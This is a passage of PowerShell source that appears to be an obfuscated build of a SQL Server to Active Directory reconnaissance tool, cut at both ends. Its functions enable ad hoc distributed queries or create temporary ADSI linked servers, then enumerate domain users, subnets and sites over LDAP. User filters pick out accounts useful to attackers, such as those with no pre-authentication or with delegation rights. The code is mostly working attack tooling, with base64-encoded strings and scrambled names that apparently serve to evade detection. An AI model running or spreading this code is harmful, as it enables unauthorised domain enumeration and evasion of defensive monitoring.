                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAJwBBAGQAIABIAG8AYwAgAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAFEAdQBlAHIAaQBlAHMAJwA=')))
                }
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAJwBBAGQAIABIAG8AYwAgAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAFEAdQBlAHIAaQBlAHMAJwAgAGEAcgBlACAAYQBsAHIAZQBhAGQAeQAgAGUAbgBhAGIAbABlAGQA')))
                }
            }
        }
        if($UseAdHoc){
            if(($LinkUsername) -and ($LinkPassword)){
                ${/===\/=====\/\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgAgAEkARAA9ACQATABpAG4AawBVAHMAZQByAG4AYQBtAGUAOwAgAFAAYQBzAHMAdwBvAHIAZAA9ACQATABpAG4AawBQAGEAcwBzAHcAbwByAGQAOwA=')))                
            }else{
                ${/===\/=====\/\/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAZABhAHQAYQBzAG8AdQByAGMAZQA='))) 
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAFIAdQBuACAAdwBpAHQAaAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAIABpAG4AIABzAHkAbgB0AGEAeAAgAG8AcAB0AGkAbwBuACAAMQAgAC0AIAB3AG8AcgBrAHMAIABhAHMAIABzAGEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAKgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAE8AUABFAE4AUgBPAFcAUwBFAFQAKAAnAEEARABTAEQAUwBPAE8AQgBKAEUAQwBUACcALAAnACQAewAvAD0APQA9AFwALwA9AD0APQA9AD0AXAAvAFwALwA9AD0AfQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAPABMAEQAQQBQADoALwAvACQATABkAGEAcABQAGEAdABoAD4AOwAkAEwAZABhAHAARgBpAGwAdABlAHIAOwAkAEwAZABhAHAARgBpAGUAbABkAHMAOwBzAHUAYgB0AHIAZQBlACcAKQA=')))
        }else{
            $Query  = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAqACAARgBSAE8ATQAgAE8AcABlAG4AUQB1AGUAcgB5ACgAJAB7AC8APQBcAC8APQBcAF8AXwAvAD0APQBcAF8ALwA9AFwALwB9ACwAJwA8AEwARABBAFAAOgAvAC8AJABMAGQAYQBwAFAAYQB0AGgAPgA7ACQATABkAGEAcABGAGkAbAB0AGUAcgA7ACQATABkAGEAcABGAGkAZQBsAGQAcwA7AHMAdQBiAHQAcgBlAGUAJwApAA==')))                 
        }                        
        If (-not($SuppressVerbose)){
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATABEAEEAUAAgAHEAdQBlAHIAeQAgAGEAZwBhAGkAbgBzAHQAIABsAG8AZwBvAG4AIABzAGUAcgB2AGUAcgAgAHUAcwBpAG4AZwAgAEEARABTAEkAIABPAEwARQBEAEIAIABzAHQAYQByAHQAZQBkAC4ALgAuAA==')))
        }        
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential
        ${___/\_/==\/\/=\_/} += ${/=\_____/\/\/=\__}         
        if(-not $UseAdHoc){
            If (-not($SuppressVerbose)){
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAG0AbwB2AGkAbgBnACAAQQBEAFMASQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAGkAbgBrACAAbgBhAG0AZQBkACAAJAB7AC8APQBcAC8APQBcAF8AXwAvAD0APQBcAF8ALwA9AFwALwB9AA==')))
            }
            ${/=\/=====\_/\_/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgBzAHAAXwBkAHIAbwBwAHMAZQByAHYAZQByACAAQABzAGUAcgB2AGUAcgA9AE4AJwAkAHsALwA9AFwALwA9AFwAXwBfAC8APQA9AFwAXwAvAD0AXAAvAH0AJwAsACAAQABkAHIAbwBwAGwAbwBnAGkAbgBzAD0AJwBkAHIAbwBwAGwAbwBnAGkAbgBzACcA')))
            ${_/\_/===\/==\/=\_} = Get-SQLQuery -Instance $Instance -Query ${/=\/=====\_/\_/\/} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        }
        if($UseAdHoc){
            If (-not($SuppressVerbose)){
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAHMAdABvAHIAaQBuAGcAIABBAGQASABvAGMAIABzAGUAdAB0AGkAbgBnAHMAIABpAGYAIABuAGUAZQBkAGUAZAAuAA==')))
            }
            Get-SQLQuery -Instance $Instance -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEEAZAAgAEgAbwBjACAARABpAHMAdAByAGkAYgB1AHQAZQBkACAAUQB1AGUAcgBpAGUAcwAnACwAJAB7AF8ALwBcAF8AXwBfAC8AXAAvAFwAXwBfAC8APQA9AD0APQB9ADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        
            Get-SQLQuery -Instance $Instance -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAkAHsALwA9AFwAXwBfAC8AXAAvAD0APQA9AD0AXABfAC8APQBcAH0AOwBSAEUAQwBPAE4ARgBJAEcAVQBSAEUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose              
        }
        If (-not($SuppressVerbose)){
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATABEAEEAUAAgAHEAdQBlAHIAeQAgAGEAZwBhAGkAbgBzAHQAIABsAG8AZwBvAG4AIABzAGUAcgB2AGUAcgAgAHUAcwBpAG4AZwAgAEEARABTAEkAIABPAEwARQBEAEIAIABjAG8AbQBwAGwAZQB0AGUALgA=')))
        } 
    }
    End
    {
        ${/=====\__/\/\/==\} = ${___/\_/==\/\/=\_/}.Row.count
        If (-not($SuppressVerbose)){
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAJAB7AC8APQA9AD0APQA9AFwAXwBfAC8AXAAvAFwALwA9AD0AXAB9ACAAcgBlAGMAbwByAGQAcwAgAHcAZQByAGUAIABmAG8AdQBuAGQALgA=')))
        } 
        return ${___/\_/==\/\/=\_/}
    }
}
Function  Get-SQLDomainUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Filter users based on state or property settings.')]
        [ValidateSet("All","Enabled","Disabled","Locked","PwNeverExpires","PwNotRequired","PreAuthNotRequired","SmartCardRequired","TrustedForDelegation","TrustedToAuthForDelegation","PwStoredRevEnc")]
        [String]$UserState,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain user to filter for.')]
        [string]$FilterUser,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Only list the users who have not changed their password in the number of days provided.')]
        [Int]$PwLastSet,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterUser)){
            $FilterUser = '*'
        }
        if((-not $PwLastSet)){
            ${__/=\/\_/========} = ""
        }else{
            ${_______/=\/\/\__/} = (Get-Date).AddDays(-$PwLastSet).ToFileTime()
            ${__/=\/\_/========} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhAHAAdwBkAEwAYQBzAHQAUwBlAHQAPgA9ACQAewBfAF8AXwBfAF8AXwBfAC8APQBcAC8AXAAvAFwAXwBfAC8AfQApAA==')))
        }
        switch ($UserState)
        {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))                         {${_/\/\/=\_/\___/\/} = ""} 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAZAA=')))                     {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhAHUAcwBlAHIAQQBjAGMAbwB1AG4AdABDAG8AbgB0AHIAbwBsADoAMQAuADIALgA4ADQAMAAuADEAMQAzADUANQA2AC4AMQAuADQALgA4ADAAMwA6AD0AMgApAA==')))} 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA==')))                    {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQA=')))} 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAawBlAGQA')))                      {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAEEATQBBAGMAYwBvAHUAbgB0AFQAeQBwAGUAPQA4ADAANQAzADAANgAzADYAOAApACgAbABvAGMAawBvAHUAdABUAGkAbQBlAD4AMAApAA==')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AE4AZQB2AGUAcgBFAHgAcABpAHIAZQBzAA==')))              {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADYANQA1ADMANgApAA==')))} 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AE4AbwB0AFIAZQBxAHUAaQByAGUAZAA=')))               {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADMAMgApAA==')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AFMAdABvAHIAZQBkAFIAZQB2AEUAbgBjAA==')))              {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMgA4ACkA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAQQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))          {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwADQAKQA=')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBtAGEAcgB0AEMAYQByAGQAUgBlAHEAdQBpAHIAZQBkAA==')))           {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIANgAyADEANAA0ACkA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABGAG8AcgBEAGUAbABlAGcAYQB0AGkAbwBuAA==')))        {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaABGAG8AcgBEAGUAbABlAGcAYQB0AGkAbwBuAA==')))  {${_/\/\/=\_/\___/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEANgA3ADcANwAyADEANgApAA==')))}
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AUABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAkAHsAXwBfAC8APQBcAC8AXABfAC8APQA9AD0APQA9AD0APQA9AH0AKABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAFUAcwBlAHIAKQAkAHsAXwAvAFwALwBcAC8APQBcAF8ALwBcAF8AXwBfAC8AXAAvAH0AKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgBhAG0AZQAsAGEAZABtAGkAbgBjAG8AdQBuAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABhAGQAcwBwAGEAdABoAA=='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AUABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAkAHsAXwBfAC8APQBcAC8AXABfAC8APQA9AD0APQA9AD0APQA9AH0AKABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAFUAcwBlAHIAKQAkAHsAXwAvAFwALwBcAC8APQBcAF8ALwBcAF8AXwBfAC8AXAAvAH0AKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgBhAG0AZQAsAGEAZABtAGkAbgBjAG8AdQBuAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABhAGQAcwBwAGEAdABoAA==')))          
        }
    }
    End
    {                                       
    }
}
Function  Get-SQLDomainSubnet
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        if($TargetDomain)
        {
            $Domain = $TargetDomain
        }else{
            $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | select DomainName -ExpandProperty DomainName
        }
        ${_/=\/\/==\___/\/\} = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgA='))) -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJABEAG8AbQBhAGkAbgApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -UseAdHoc | select distinguishedname -ExpandProperty distinguishedname
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAHUAYgBuAGUAdAApAA=='))) -LdapPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgAvAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALAAkAHsAXwAvAD0AXAAvAFwALwA9AD0AXABfAF8AXwAvAFwALwBcAH0A'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHMAaQB0AGUAbwBiAGoAZQBjAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABsAG8AYwBhAHQAaQBvAG4A'))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAHUAYgBuAGUAdAApAA=='))) -LdapPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgAvAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALAAkAHsAXwAvAD0AXAAvAFwALwA9AD0AXABfAF8AXwAvAFwALwBcAH0A'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHMAaQB0AGUAbwBiAGoAZQBjAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABsAG8AYwBhAHQAaQBvAG4A')))          
        }
    }
    End
    {
    }
}
Function  Get-SQLDomainSite
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        if($TargetDomain)
        {
            $Domain = $TargetDomain
        }else{
            $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | select DomainName -ExpandProperty DomainName
        }
        ${_/=\/\/==\___/\/\} = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgA='))) -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJABEAG8AbQBhAGkAbgApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -UseAdHoc | select distinguishedname -ExpandProperty distinguishedname
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAGkAdABlACkA'))) -LdapPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgAvAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALAAkAHsAXwAvAD0AXAAvAFwALwA9AD0AXABfAF8AXwAvAFwALwBcAH0A'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAGkAdABlACkA'))) -LdapPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgAvAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALAAkAHsAXwAvAD0AXAAvAFwALwA9AD0AXABfAF8AXwAvAFwALwBcAH0A'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA=')))          
        }
    }
    End
    {
    }
}
Function  Get-SQLDomainComputer
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain computer to filter for.')]
        [string]$FilterComputer,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterComputer)){
            $FilterComputer = '*'
        }
    }
    Process
